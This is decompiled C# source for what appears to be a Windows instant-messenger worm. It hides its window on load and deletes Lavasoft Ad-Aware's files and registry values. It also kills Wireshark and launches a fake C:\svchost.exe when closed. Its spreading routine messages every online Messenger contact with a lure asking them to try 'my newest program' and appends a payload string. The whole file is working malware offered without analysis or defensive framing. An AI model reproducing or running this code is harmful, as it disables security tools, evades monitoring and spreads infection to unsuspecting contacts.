using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using MessengerAPI;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns1;

[DesignerGenerated]
internal class Form1 : Form
{
	private IContainer icontainer_0;

	private Mutex mutex_0;

	private string string_0;

	public Form1()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		string_0 = Environment.UserName + "Mutex";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void Sleep(long dwMilliseconds);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool deletefile(string path);

	public static void smethod_0()
	{
		List<string> list = new List<string>();
		string text = "Shell32.GETCSIDLPath(Shell32.CSIDL.CSIDL_PROGRAM_FILES)";
		list.Add(text + "\\Lavasoft\\");
		foreach (string item in list)
		{
			if (!Directory.Exists(item))
			{
				continue;
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(item);
			FileInfo[] files = directoryInfo.GetFiles("*.*", SearchOption.AllDirectories);
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				try
				{
					File.Delete(fileInfo.FullName);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Lavasoft\\Ad-Aware\\", writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array2 = valueNames;
		foreach (string name in array2)
		{
			try
			{
				registryKey.DeleteValue(name);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		registryKey.Close();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		mutex_0 = new Mutex(initiallyOwned: false, string_0);
		if (!mutex_0.WaitOne(0, exitContext: false))
		{
			mutex_0.Close();
			mutex_0 = null;
			ProjectData.EndApp();
		}
		Class8.smethod_0();
		int num = default(int);
		while (true)
		{
			num = checked(num + 1);
			Class9.smethod_0();
			Class10.smethod_0();
			Class13.smethod_0();
			Class16.smethod_0();
			Class14.smethod_0();
			Class15.smethod_0();
			method_1();
			Class9.smethod_0();
			Class7.smethod_0();
			Sleep(150000L);
			if (num == 3)
			{
				ProjectData.EndApp();
			}
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Process.Start("C:\\svchost.exe");
	}

	public void method_0()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			string mainWindowTitle = process.MainWindowTitle;
			if (string.Equals(mainWindowTitle, "The Wireshark Network Analyzer"))
			{
				process.Kill();
			}
		}
	}

	public void method_1()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Invalid comparison between Unknown and I4
		Messenger val = (Messenger)new MessengerClass();
		IMessengerContacts val2 = (IMessengerContacts)((IMessenger3)val).get_MyContacts();
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = val2.GetEnumerator();
			while (enumerator.MoveNext())
			{
				IMessengerContact val3 = (IMessengerContact)enumerator.Current;
				if ((int)val3.get_Status() != 1 && !val3.get_Blocked())
				{
					((IMessenger3)val).InstantMessage((object)val3.get_SigninName());
					SendKeys.SendWait("Hey I just got into program coding and would you please tell me how I did? Here is my newest program." + Class8.string_0);
					SendKeys.SendWait("{ENTER}");
					SendKeys.SendWait("{ESC}");
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}
}
